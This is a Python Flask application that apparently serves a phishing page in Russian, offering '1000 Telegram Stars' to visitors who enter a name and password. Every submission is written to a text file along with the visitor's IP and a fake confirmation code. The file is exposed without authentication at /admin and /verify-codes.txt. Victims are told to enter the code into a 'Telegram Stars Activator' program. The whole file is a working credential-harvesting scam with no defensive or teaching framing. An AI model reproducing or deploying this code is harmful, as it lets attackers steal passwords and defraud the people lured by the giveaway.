from flask import Flask, request, render_template_string, redirect, url_for
import random
import os
from datetime import datetime

app = Flask(__name__)

CODES_FILE = "verify-codes.txt"

# Хранилище попыток по IP
attempts = {}

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# Главная страница с формой
HTML_FORM = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Получи Telegram Stars</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 { color: #333; margin-bottom: 10px; }
        .stars { font-size: 48px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #5a67d8; }
        .attempts {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="stars">⭐️⭐️⭐️</div>
        <h1>1000 Telegram Stars</h1>
        <p>Акция! Заполните форму и получите звёзды</p>
        <form method="POST" action="/generate">
            <input type="text" name="name" placeholder="Ваше имя" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">🎁 Получить</button>
        </form>
        <div class="attempts">Осталось попыток: {{ attempts_left }} из 3</div>
    </div>
</body>
</html>
"""

# Страница с кодом
HTML_CODE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Код подтверждения</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        .code {
            font-size: 64px;
            letter-spacing: 10px;
            font-weight: bold;
            color: #667eea;
            margin: 20px 0;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        .note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>✅ Код подтверждения</h2>
        <div class="code">{{ code }}</div>
        <p>Введите этот код в программу <strong>Telegram Stars Activator</strong></p>
        <button onclick="location.href='/'">На главную</button>
        <div class="note">Код действителен 5 минут</div>
    </div>
</body>
</html>
"""

# Страница окончания акции
HTML_END = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Акция закончена</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
        }
        .reset-link {
            display: inline-block;
            margin-top: 15px;
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>😢 Акция закончилась</h2>
        <p>Все звёзды уже разобрали. Попробуйте в следующий раз!</p>
        <button onclick="location.href='/reset'">🔄 Обновить</button>
        <a href="/reset" class="reset-link">или нажмите здесь</a>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    ip = get_client_ip()
    used = attempts.get(ip, 0)
    if used >= 3:
        return HTML_END
    return render_template_string(HTML_FORM, attempts_left=3 - used)

@app.route('/generate', methods=['POST'])
def generate():
    ip = get_client_ip()
    
    if attempts.get(ip, 0) >= 3:
        return HTML_END
    
    name = request.form.get('name')
    password = request.form.get('password')
    
    # Генерация кода
    code = f"{random.randint(0, 9999):04d}"
    
    # Сохраняем данные
    with open(CODES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {ip} | {name} | {password} | {code}\n")
    
    # Увеличиваем счётчик попыток
    attempts[ip] = attempts.get(ip, 0) + 1
    
    return render_template_string(HTML_CODE, code=code)

@app.route('/reset')
def reset():
    ip = get_client_ip()
    if ip in attempts:
        del attempts[ip]
    return redirect('/')

@app.route('/verify-codes.txt')
def verify_codes():
    if not os.path.exists(CODES_FILE):
        return "Нет кодов"
    with open(CODES_FILE, 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/admin')
def admin():
    if not os.path.exists(CODES_FILE):
        return "<h3>Пока ни одного кода</h3>"
    with open(CODES_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    return f"<pre style='font-family: monospace; font-size: 14px;'>{content}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
